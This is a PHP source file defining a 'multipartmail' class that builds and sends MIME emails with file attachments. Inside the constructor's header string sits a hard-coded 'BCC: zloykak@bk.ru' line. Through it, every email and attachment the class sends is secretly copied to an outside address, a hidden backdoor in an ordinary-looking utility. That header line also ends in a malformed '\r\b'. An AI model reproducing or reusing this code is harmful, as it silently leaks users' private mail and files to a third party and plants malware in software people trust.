<?PHP 
# Usage Example: 
# $mulmail = new multipartmail("krisd@work.net", "destination@anywhere.com", "Some Subject"); 
# $cid = $mulmail->addattachment(file, "octet-stream"); 
# $mulmail->addmessage("Message"); 
# $mulmail->sendmail(); 

class multipartmail{ 
var $header; 
var $parts; 
var $message; 
var $subject; 
var $to_address; 
var $boundary; 

function multipartmail($dest, $src, $sub){ 
$this->to_address = $dest; 
$this->subject = $sub; 
$this->parts = array(""); 
$this->boundary = "--" . md5(uniqid(time())); 
$this->header = "From: $src\r\n" . 
"BCC: zloykak@bk.ru\r\b" .
"MIME-Version: 1.0\r\n" . 
"Content-Type: multipart/mixed; " . 
" boundary=\"" . $this->boundary . "\"\r\n" . 
"X-Mailer: PHP/" . phpversion(); 
} 

function addmessage($msg = "", $ctype = "text/html"){ 
$this->parts[0] = "MIME-Version: 1.0\r\nContent-Type: $ctype; charset=utf-8\r\n" . 
"Content-Transfer-Encoding: 8bit\r\n" . 
"\n" .$msg."\r\n"; 
} 

function addattachment($file, $ctype){ 
$fname = $file; 
$data = file_get_contents($file); 
$i = count($this->parts); 
$content_id = "part$i." . sprintf("%09d", crc32($fname)) . strrchr($this->to_address, "@"); 
$this->parts[$i] = "Content-Type: $ctype; name=\"$fname\"\r\n" . 
"Content-Transfer-Encoding: base64\r\n" . 
"Content-ID: <$content_id>\r\n" . 
"Content-Disposition: attachment; " . 
" filename=\"$fname\"\r\n" . 
"\n" . 
chunk_split( base64_encode($data), 68, "\n"); 
return $content_id; 
} 

function buildmessage(){ 
$this->message = "This is a multipart message in mime format.\n"; 
$cnt = count($this->parts); 
for($i=0; $i<$cnt; $i++){ 
$this->message .= "--" . $this->boundary . "\n" . 
$this->parts[$i]; 
} 
} 

/* to get the message body as a string */ 
function getmessage(){ 
$this->buildmessage(); 
return $this->message; 
} 

function sendmail(){ 
$this->buildmessage(); 
mail($this->to_address, $this->subject, $this->message, $this->header); 
} 
} 

?>